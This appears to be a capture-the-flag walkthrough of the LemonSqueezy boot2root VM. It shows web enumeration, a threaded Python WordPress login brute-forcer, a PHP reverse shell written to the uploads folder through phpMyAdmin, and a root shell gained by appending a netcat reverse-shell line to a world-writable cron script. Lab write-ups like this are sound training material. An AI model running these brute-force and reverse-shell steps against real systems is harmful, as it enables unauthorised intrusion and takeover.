@@ -1,0 +1,254 @@
+I"@<p>This is a boot2root machine created by <strong>James Hay</strong>, whose principal goal is to get root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>With nmap I did a ping scan on the local network to detect the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-24 17:57 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.158
+Host is up <span class="o">(</span>0.00061s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:0C:29:E2:78:CF <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00016s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:FA:F3:F9 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.60 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Then I performed a full TCP port scan to detect available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">--open</span> <span class="nt">-p-</span> 192.168.179.158 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT   STATE SERVICE
+80/tcp open  http
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>With nmap I did service and OS detection, script scanning and traceroute on the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span> <span class="nt">-A</span> 192.168.179.158 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Apache2 Debian Default Page: It works
+</code></pre></div></div>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>In the web service the apache web page is running, but I didn’t find anything else.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-1.png" alt="" /></p>
+
+<p>So I ran wfuzz to find hidden directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404  <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.158/FUZZ
+...
+000000587:   301        9 L      28 W       322 Ch      <span class="s2">"wordpress"</span>  
+000000730:   301        9 L      28 W       319 Ch      <span class="s2">"manual"</span>     
+000001073:   301        9 L      28 W       323 Ch      <span class="s2">"javascript"</span>  
+000010825:   301        9 L      28 W       323 Ch      <span class="s2">"phpmyadmin"</span>
+</code></pre></div></div>
+
+<p>In the wfuzz output we can see the wordpress directory, I accessed it but I had problems with the page resolution.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-2.png" alt="" /></p>
+
+<p>In the page source I saw that’s requesting a domain name, to solve the page resolution we need to add the ip address and that domain name in the system hosts file.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.158 lemonsqueezy'</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-4.png" alt="" /></p>
+
+<p>Then I enumerated the wordpress CMS, found a writable web directory and two users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://lemonsqueezy/wordpress/ <span class="nt">-e</span> vp,vt,u
+...
+<span class="o">[</span>+] Upload directory has listing enabled: http://lemonsqueezy/wordpress/wp-content/uploads/
+ | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>                                      
+ | Confidence: 100%
+ ...
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] lemon
+ | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |   - http://lemonsqueezy/wordpress/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] orange
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<p>I developed a python script to brute force the login page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+
+import requests
+import os
+import threading
+from queue import Queue
+from colorama import init,Fore
+
+init<span class="o">()</span>
+<span class="nv">green</span><span class="o">=</span>Fore.GREEN
+<span class="nv">gray</span><span class="o">=</span>Fore.LIGHTBLACK_EX
+<span class="nv">reset</span><span class="o">=</span>Fore.RESET
+
+<span class="nv">url</span><span class="o">=</span><span class="s2">"http://lemonsqueezy/wordpress/wp-login.php"</span>
+<span class="nv">user</span><span class="o">=</span><span class="s2">"orange"</span>
+<span class="nv">print_lock</span><span class="o">=</span>threading.Lock<span class="o">()</span>
+
+def bflogin<span class="o">(</span>passwd<span class="o">)</span>:
+    <span class="nv">data</span><span class="o">={</span>
+            <span class="s1">'log'</span>:user,
+            <span class="s1">'pwd'</span>:passwd,
+            <span class="s1">'wp-submit'</span>:<span class="s1">'Log+In'</span>
+            <span class="o">}</span>
+
+    <span class="nv">r</span><span class="o">=</span>requests.post<span class="o">(</span>url,data<span class="o">=</span>data<span class="o">)</span>
+
+    <span class="k">if</span> <span class="s1">'ERROR'</span> not <span class="k">in </span>r.text:
+        with print_lock:
+            print<span class="o">(</span>f<span class="s2">"{green}[+] Found: {passwd:20}{reset}"</span><span class="o">)</span>
+            os._exit<span class="o">(</span>1<span class="o">)</span>
+    <span class="k">else</span>:
+        with print_lock:
+            print<span class="o">(</span>f<span class="s2">"{gray}[-] Password {passwd:15}{reset}"</span>, <span class="nv">end</span><span class="o">=</span><span class="s1">'\r'</span><span class="o">)</span>
+
+def threader<span class="o">()</span>:
+    <span class="k">while </span>True:
+        <span class="nv">worker</span><span class="o">=</span>q.get<span class="o">()</span>
+        bflogin<span class="o">(</span>worker<span class="o">)</span>
+        q.task_done<span class="o">()</span>
+
+<span class="nv">q</span><span class="o">=</span>Queue<span class="o">()</span>
+
+<span class="k">for </span>x <span class="k">in </span>range<span class="o">(</span>10<span class="o">)</span>:
+    <span class="nv">t</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>threader<span class="o">)</span>
+    t.daemon<span class="o">=</span>True
+    t.start<span class="o">()</span>
+
+<span class="nv">wordlist</span><span class="o">=</span>open<span class="o">(</span><span class="s2">"/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"</span><span class="o">)</span>.read<span class="o">()</span>.splitlines<span class="o">()</span>
+
+<span class="k">for </span>p <span class="k">in </span>wordlist:
+    q.put<span class="o">(</span>p<span class="o">)</span>
+
+q.join<span class="o">()</span>
+</code></pre></div></div>
+
+<p>I ran the script, after a few seconds I found the password for the orange user, and logged in.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@kali:~/lemonsqueezy<span class="nv">$ </span>python3 wpbforce.py
+<span class="o">[</span>+] Found: ginger
+</code></pre></div></div>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-5.png" alt="" /></p>
+
+<p>In the posts I found a string, possibly a password.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-6.png" alt="" /></p>
+
+<p>So I tried to log in to phpMyAdmin as the orange user with the password <strong>n0t1n@w0rdl1st!</strong>.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-7.png" alt="" /></p>
+
+<p>I had successful access, so we can see the password hashes of wordpress and try to crack them.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-8.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="phpmyadmin">phpMyAdmin</h3>
+
+<p>I tried to write a file on the server in the wordpress uploads directory that I found previously, this is allow since this has write permissions, in this case was possible to write the phpinfo function.</p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-10.png" alt="" /></p>
+
+<p>I used a pentestmonkey php reverse shell, I changed the IP addres with the IP of the attacking machine and the port, then I encoded it to hexadecimal and wrote it in the uploads directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+root@kali:~/lemonsqueezy<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php 
+root@kali:~/lemonsqueezy<span class="nv">$ </span>xxd <span class="nt">-ps</span> shell.php | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> c
+</code></pre></div></div>
+
+<p><img src="/assets/images/lemonsqueezy/screenshot-11.png" alt="" /></p>
+
+<p>Then we need to set up a netcat listener and run the following curl instruction.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>curl <span class="nt">-s</span> http://lemonsqueezy/wordpress/wp-content/uploads/z.php
+</code></pre></div></div>
+
+<p>As we see I got a shell and upgraded it to a TTY shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/lemonsqueezy<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                                               
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.158] 41036
+Linux lemonsqueezy 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 GNU/Linux</span>
+ 09:57:59 up  2:32,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ python -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
+www-data@lemonsqueezy:/$
+</span></code></pre></div></div>
+
+<p>Listing the writable files, I found the logrotate python script, this removes the tmp directory, it also has write permissions for all users, I can use this script to elevate our privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@lemonsqueezy:/<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
+&lt;<span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
+/var/lib/wordpress/wp-content/index.php
+/etc/logrotate.d/logrotate
+www-data@lemonsqueezy:/<span class="nv">$ </span><span class="nb">cat</span> /etc/logrotate.d/logrotate
+<span class="nb">cat</span> /etc/logrotate.d/logrotate
+<span class="c">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+   os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
+except:
+    sys.exit<span class="o">()</span>
+www-data@lemonsqueezy:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/logrotate.d/logrotate
+<span class="nb">ls</span> <span class="nt">-la</span> /etc/logrotate.d/logrotate
+<span class="nt">-rwxrwxrwx</span> 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cron-job">Cron Job</h3>
+
+<p>To get root I added a netcat reverse shell to logrotate script, started a netcat listener wait a minutes and I got a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@lemonsqueezy:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'os.system("nc 192.168.179.1 1331 -e /bin/bash ")'</span> <span class="o">&gt;&gt;</span> /etc/logrotate.d/logrotate
+
+root@kali:~/lemonsqueezy<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1331
+listening on <span class="o">[</span>any] 1331 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.158] 41410
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+script <span class="nt">-qc</span> /bin/bash /dev/null
+root@lemonsqueezy:~# <span class="nb">ls
+ls
+</span>root.txt
+root@lemonsqueezy:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+<span class="nv">NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4</span><span class="o">=</span>
+</code></pre></div></div>
+
+:ET
